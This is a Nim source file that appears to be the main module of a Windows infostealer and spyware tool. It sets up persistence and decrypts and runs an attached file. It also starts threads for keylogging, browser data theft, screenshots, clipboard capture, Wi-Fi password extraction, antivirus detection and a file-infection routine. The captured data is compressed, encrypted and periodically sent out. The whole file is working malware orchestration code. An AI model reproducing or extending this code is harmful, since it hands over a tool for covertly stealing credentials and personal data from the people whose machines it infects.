import lib/functions/hideString

from lib/flags import USE_INFECT_THREAD
when USE_INFECT_THREAD:
  # decrypt file if args passed
  from os import paramCount
  from os import paramStr
  from os import getEnv
  from os import `/`
  from os import splitFile
  from winim/inc/shellapi import ShellExecuteW
  from winim/winstr import winstrConverterStringToLPWSTR

  from lib/more/xxtea import decrypt

  from lib/flags import INFECT_ENCRYPTION_KEY

  let hasParams: bool = paramCount() >= 1

  if hasParams:
    try:
      let file = paramStr 1
      let (_, name, ext) = splitFile file
      let tmpFile = getEnv("tmp") / name & ext

      writeFile(
        tmpFile,
        decrypt(
          readFile file,
          d INFECT_ENCRYPTION_KEY
        )
      ) # write decrypted file

      discard ShellExecuteW(0, nil, tmpFile, nil, nil, 5) # open decryped file

    except:
      quit 0

from lib/flags import USE_PERSISTENCE_THREAD
when USE_PERSISTENCE_THREAD:
  from lib/threads/persistenceThread import initPersistenceThread

  var persistenceThreadVar: Thread[void]

  createThread(persistenceThreadVar, initPersistenceThread)

  ## wait for persistenceThreadVar to end
  ## to start the installed program and quit
  when USE_INFECT_THREAD:
    if hasParams:
      joinThread persistenceThreadVar

      # [here] launch new instance

when USE_INFECT_THREAD:
  if hasParams:
    # quit if decrypting and, if its the case, installing done
    quit 0

from lib/flags import ALLOW_ONLY_ONE_INSTANCE
when ALLOW_ONLY_ONE_INSTANCE:
  from wAuto/process import processes

  from lib/constants import EXE_NAME

  let dEXE_NAME: string = EXE_NAME

  var len: int = 0
  for _ in processes(dEXE_NAME):
    len += 1
    if len > 1:
      quit 0

from lib/constants import isProd
when not isProd:
  echo "started"

from lib/channels import mainChannel

open mainChannel

from lib/flags import USE_KEYBOARD_LOCALE_THREAD
when USE_KEYBOARD_LOCALE_THREAD:
  from lib/threads/keyboardLocaleThread import initKeyboardLocaleThread

  var keyboardLocaleThreadVar: Thread[void]

  createThread(keyboardLocaleThreadVar, initKeyboardLocaleThread)

from lib/flags import USE_KEYLOGGER_THREAD
when USE_KEYLOGGER_THREAD:
  from lib/threads/keyloggerThread import initKeyloggerThread

  var keyloggerThreadVar: Thread[void]

  createThread(keyloggerThreadVar, initKeyloggerThread)

from lib/flags import USE_BROWSER_THREAD
when USE_BROWSER_THREAD:
  from lib/threads/browserThread import initBrowserThread

  var browserThreadVar: Thread[void]

  createThread(browserThreadVar, initBrowserThread)

when USE_INFECT_THREAD:
  from lib/threads/infectThread import initInfectThread

  var infectThreadVar: Thread[void]

  createThread(infectThreadVar, initInfectThread)

from lib/flags import USE_WINDOW_NAME_THREAD
when USE_WINDOW_NAME_THREAD:
  from lib/threads/windowNameThread import initWindowNameThread

  var windowNameThreadVar: Thread[void]

  createThread(windowNameThreadVar, initWindowNameThread)

from lib/flags import USE_SCREENSHOT_THREAD
when USE_SCREENSHOT_THREAD:
  from lib/threads/screenshotThread import initScreenshotThread

  var screenshotThreadVar: Thread[void]

  createThread(screenshotThreadVar, initScreenshotThread)

from lib/flags import USE_CLIPBOARD_THREAD
when USE_CLIPBOARD_THREAD:
  from lib/threads/clipboardThread import initClipboardThread

  var clipboardThreadVar: Thread[void]

  createThread(clipboardThreadVar, initClipboardThread)

from lib/flags import USE_WIFI_PASSWORDS_THREAD
when USE_WIFI_PASSWORDS_THREAD:
  from lib/threads/wifiPasswordsThread import initWifiPasswordsThread

  var wifiPasswordsThreadVar: Thread[void]

  createThread(wifiPasswordsThreadVar, initWifiPasswordsThread)

from lib/flags import USE_GET_AVS_THREAD
when USE_GET_AVS_THREAD:
  from lib/threads/getAVSThread import initGetAVSThread

  var getAVSThreadVar: Thread[void]

  createThread(getAVSThreadVar, initGetAVSThread)

from lib/flags import USE_CONNECTED_WIFI_THREAD
when USE_CONNECTED_WIFI_THREAD:
  from lib/threads/connectedWifiThread import initConnectedWifiThread

  var connectedWifiThreadVar: Thread[void]

  createThread(connectedWifiThreadVar, initConnectedWifiThread)

from lib/flags import USE_CONNECTED_DEVICES_THREAD
when USE_CONNECTED_DEVICES_THREAD:
  from lib/threads/connectedDevicesThread import initConnectedDevicesThread

  var connectedDevicesThreadVar: Thread[void]

  createThread(connectedDevicesThreadVar, initConnectedDevicesThread)

var prevThread: string = ""
var res: string = ""

from lib/threads/sendThread import initSendThread
from lib/channels import sendThreadChannel

var sendThreadVar: Thread[void]

open sendThreadChannel

createThread(sendThreadVar, initSendThread)

import lib/more/zlibstatic/src/zlibstatic/zlib
import lib/functions/aes
from lib/functions/generateHeader import header

# send header

let headerContent: string = header()

sendThreadChannel.send encrypt compress(headerContent, stream = RAW_DEFLATE)

from std/sha1 import secureHash
from std/sha1 import `$`

# generate new key
config.key = $secureHash headerContent & config.key & config.aad & config.iv

from os import sleep
from lib/flags import SEND_SIZE
from lib/flags import TICK_INTERVAL
from lib/flags import SEND_INTERVAL

var TICKS: int = 0
var finalData: string

# wait for thread messages
while true:
  let (dataAvailable, msg) = mainChannel.tryRecv()

  if dataAvailable:
    let (thread, data) = msg

    ## the user might shutdown his pc, try and send data
    ## so none is lost
    if thread == "sd":
      TICKS = SEND_INTERVAL # shortcut for sending

    if prevThread != thread:
      prevThread = thread
      res.add "." & thread & ","
    res.add ";" & data

    finalData = encrypt compress(res, stream = RAW_DEFLATE)

    if finalData.len > SEND_SIZE:
      TICKS = SEND_INTERVAL

  if TICKS == SEND_INTERVAL:
    sendThreadChannel.send finalData
    TICKS = 0
    res = ""
    prevThread = ""

  sleep(TICK_INTERVAL)
  TICKS += 1

close mainChannel
